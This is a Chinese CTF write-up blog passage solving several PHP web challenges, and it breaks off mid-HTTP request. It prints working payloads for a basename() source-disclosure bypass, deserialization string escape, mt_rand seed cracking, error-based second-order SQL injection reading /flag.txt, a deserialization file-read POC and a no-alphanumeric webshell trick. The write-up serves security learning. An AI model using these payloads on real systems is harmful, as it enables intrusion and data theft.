thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里匹配了一串随机字符串给guess进行比较，很明显是不能走这里拿flag的。</p><p>那么回头看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中==$_SERVER[‘PHP_SELF’]==，会读取当前PHP文件相对于网站根目录的位置地址。</p><p>这里发现了一个<code>basename()</code>函数，这个函数会返回路径中的文件名部分，但是这个函数有一个问题，它会去掉文件名开头的非ASCII值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(<span class="string">&quot;config.php/%ff&quot;</span>); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure><p>然后再加个source参数就可以读取源码了。</p><p>最终payload</p><blockquote><p>/index.php/config.php/%ff?source</p></blockquote><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>使用dirsearch进行目录检索可以查到有一个==<a href="http://www.zip==,直接下载下来可以看到源码./">www.zip==，直接下载下来可以看到源码。</a></p><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>在<code>profile.php</code>里可以看到<code>file_get_contents</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>然后在<code>config.php</code>里发现了flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以我们可以通过<code>file_get_contents</code>函数读取<code>config.php</code>以拿到flag。</p><p>但是这里需要使<code>$profile[&#39;photo&#39;]</code>可控，于是在<code>update.php</code>里发现这一段。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p>这里可以通过提交<code>nickname</code>进行反序列化字符逃逸，把原来的<code>photo</code>顶掉换成我们想要的。</p><p>原来构造得到的序列化字符是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后我们把我们需要的<code>config.php</code>加进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>但是这里还有一个点就是前面有一个if限制了nickname的长度。</p><p>于是我们可以选择数组进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;i:<span class="number">11111111111</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;1234567890@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">9</span>:<span class="string">&quot;need_here&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后由于我们是在<code>nickname</code>里输入的，所以需要将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这34个字符逃逸出来。</p><p>这里因为最后进<code>update_profile()</code>函数里后会有一个正则，正则会替换一些字符串为<code>hacker</code>，这里可以取巧一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为我们需要逃逸共34个字符，而替换的hacker为6个字符，所以我们可以选择where进行替换，这样每替换一个字符串长度都会+1</span><br><span class="line">where&#x3D;5 &#x3D;&gt; 34*5&#x3D;170</span><br><span class="line">hacker&#x3D;6 &#x3D;&gt; 34*6&#x3D;204 &#x3D;&gt; 204-170&#x3D;34</span><br></pre></td></tr></table></figure><p>这样子就可以逃逸出34个字符了</p><p>然后注册登陆update就可以拿到flag了</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>在network里可以跟到check.php，得到源码。</p><p>核心就是这一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里很明显是要拿到seed然后逆向拿到原字符串才能得到flag。</p><h3 id="seed爆破"><a href="#seed爆破" class="headerlink" title="seed爆破"></a>seed爆破</h3><p>这里可以用php_mt_seed进行爆破，<a href="https://xz.aliyun.com/t/3656#toc-3">原理看这</a>。</p><p>但是爆破前需要转成工具所需的格式，这里放脚本，具体也是看原理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;hch2FuienH&#x27;</span> // 已经给出的字符串放这</span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>然后将得到的数据拿到<code>php_mt_seed</code>里爆破即可得到<code>seed</code>。</p><p>![](C:\Users\violet\Desktop\my blog\blog\source_posts\WriteUp\BUUOJ web 1pts\nS6mYpkeVGcbyhu.png)</p><p>这里得出的seed=904536600，放回去爆出原字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">904536600</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>然后提交即可得到flag。</p><blockquote><p>flag{bb7792f8-ba2d-4fe0-84c5-22aa8ea48825}</p></blockquote><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><h3 id="php伪协议读取文件"><a href="#php伪协议读取文件" class="headerlink" title="php伪协议读取文件"></a>php伪协议读取文件</h3><p>打开网页源代码可以发现一个file参数，使用php伪协议进行文件截流即可读取文件。</p><blockquote><p>url_here?file=php://filter/convert.base64-encode/resource=confirm.php</p></blockquote><p>总共有confirm.php, change.php, search.php, index.php, delete.php这几个文件。</p><h3 id="sql二次报错注入"><a href="#sql二次报错注入" class="headerlink" title="sql二次报错注入"></a>sql二次报错注入</h3><p>挺多参数给过滤过了，但是唯独address没有被过滤，可以从这里入手。</p><p>先直接提交address</p><blockquote><p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,30)),0x7e),1)#</p></blockquote><p>这时address已经被录入进数据库中了，然后我们从change.php里再次调用address就会触发sql注入。</p><p>得到一半的flag</p><blockquote><p>errorXPATH syntax error: ‘<del>flag{ae44900b-3688-41e7-ab00-2</del>‘</p></blockquote><p>然后再次注入就可以拿到完整的flag了</p><blockquote><p>flag{ae44900b-3688-41e7-ab00-20da18e3d421}</p></blockquote><h2 id="津门杯2021-power-cut"><a href="#津门杯2021-power-cut" class="headerlink" title="[津门杯2021]power_cut"></a>[津门杯2021]power_cut</h2><h3 id="swp源码泄露"><a href="#swp源码泄露" class="headerlink" title="swp源码泄露"></a>swp源码泄露</h3><p><code>.index.php.swp</code>下载index.php源码，得到的源码是混乱的，需要重新自己整理一下o(´^｀)o。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fd</span> = fopen(<span class="keyword">$this</span>-&gt;logFile, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>, <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>看源码可以知道是一道简单的反序列化题。</p><p>首先是<code>__wakeup()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进到了logger类里，logger类里有一个<code>__construct</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个readfile，到这应该就可以拿到flag了，大概顺序就是</p><blockquote><p>weblog -&gt; __wakeup() -&gt; logger -&gt; __construct() -&gt; readfile</p></blockquote><p>poc在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg = <span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg = <span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile = <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> weblog();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$log</span>);</span><br></pre></td></tr></table></figure><p>这里穿的时候要注意一下，刚开始有个正则需要双写绕。</p><h2 id="津门杯2021-hate-php"><a href="#津门杯2021-hate-php" class="headerlink" title="[津门杯2021]hate_php"></a>[津门杯2021]hate_php</h2><p>这题是一道无字母数字的trick，可以用p神的方法绕，<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">原理在这</a>。</p><p>虽然@被ban了，但是还可以用?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?code=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.%<span class="number">20</span>/???/????????[?-[]`;<span class="meta">?&gt;</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">122.112</span><span class="number">.214</span><span class="number">.101</span>:<span class="number">20002</span></span><br><span 